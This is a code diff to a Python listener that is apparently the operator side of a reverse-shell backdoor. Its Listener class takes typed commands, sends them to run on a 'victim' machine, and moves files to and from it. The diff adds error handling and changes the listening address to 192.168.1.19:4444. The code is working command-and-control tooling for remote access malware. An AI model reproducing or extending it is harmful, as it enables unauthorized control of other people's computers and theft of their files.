@@ -50,14 +50,21 @@ class Listener:
             except:
                 command = input(">>")
             command = command.split(" ")
-            if command[0] == "upload":
-                content = self.read_file(command[1])
-                command.append(content)
-            output = self.execute_at_victim(command)
-            if command[0] == "download":
-                output = self.write_file(command[1], output)
+            try:
+                if command[0] == "upload":
+                    content = self.read_file(command[1])
+                    command.append(content)
+                output = self.execute_at_victim(command)
+                if command[0] == "download" and "[-]" not in output:
+                    output = self.write_file(command[1], output)
+            except Exception:
+                output = "[-] ERROR, failed to execute command."
+
             print(output)
 
+try:
+    listen = Listener("192.168.1.19", 4444)
+    listen.start()
+except Exception:
+    print("[-] Failed to start server.")
 
-listen = Listener("192.168.1.17", 4444)
-listen.start()
